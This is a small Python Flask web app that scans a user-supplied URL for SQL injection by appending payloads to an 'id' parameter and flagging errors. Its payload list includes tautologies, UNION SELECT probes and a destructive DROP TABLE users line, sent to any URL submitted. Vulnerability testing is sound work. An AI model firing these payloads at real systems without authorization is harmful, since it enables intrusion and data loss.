from flask import Flask, render_template, request
import requests
from datetime import datetime

app = Flask(__name__)

# Enhanced Scanner Function with additional payloads
def scan_url(target_url):
    results = []
    payloads = [
        "'", "' OR '1'='1", "' OR '1'='1' -- ", "'; DROP TABLE users; --",
        "' AND 1=2 UNION SELECT NULL, version(); --", "' UNION ALL SELECT NULL, NULL, NULL"
    ]
    for payload in payloads:
        test_url = f"{target_url}?id={payload}"
        try:
            response = requests.get(test_url, timeout=5)
            if "error" in response.text.lower() or response.status_code == 500:
                results.append({
                    "payload": payload,
                    "status_code": response.status_code,
                    "message": "⚠️ Potential vulnerability detected"
                })
            else:
                results.append({
                    "payload": payload,
                    "status_code": response.status_code,
                    "message": "✅ No vulnerability detected"
                })
        except requests.exceptions.RequestException as e:
            results.append({
                "payload": payload,
                "status_code": "N/A",
                "message": f"❌ Error occurred: {e}"
            })
    return results

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/scan', methods=['POST'])
def scan():
    target_url = request.form.get('url')
    if not target_url.startswith("http"):
        return render_template('index.html', error="❌ Invalid URL! Please include http:// or https://")
    
    # Run the scanner
    results = scan_url(target_url)
    return render_template(
        'results.html',
        results=results,
        url=target_url,
        timestamp=datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    )

if __name__ == '__main__':
    app.run(debug=True)
